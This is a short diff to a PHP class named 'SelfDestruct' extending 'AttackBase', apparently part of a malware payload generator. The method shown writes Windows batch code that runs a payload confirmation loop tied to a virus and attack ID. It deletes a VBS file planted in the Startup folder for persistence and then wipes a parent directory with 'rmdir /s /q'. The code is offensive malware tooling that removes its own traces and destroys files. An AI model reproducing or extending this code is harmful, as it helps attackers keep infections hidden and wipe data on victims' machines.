@@ -25,14 +25,13 @@ class SelfDestruct extends AttackBase {
         return $this->access_token;
     }
 
-    public function generateBatchCode(): string {
-        ob_start();
+    public function generateBatchCode(): void {
         $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
         $UFile = "$startup_directory\\U" . substr($this->virus_id, 0, 5) . ".vbs";
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo "del \"$UFile\"\n"; //@formatter:off ?>
         rmdir /s /q "%~pd0..\..\.."
-        <?php return ob_get_clean(); //@formatter:on
+        <?php //@formatter:on
     }
 
     private function generateUploadCode(): string {
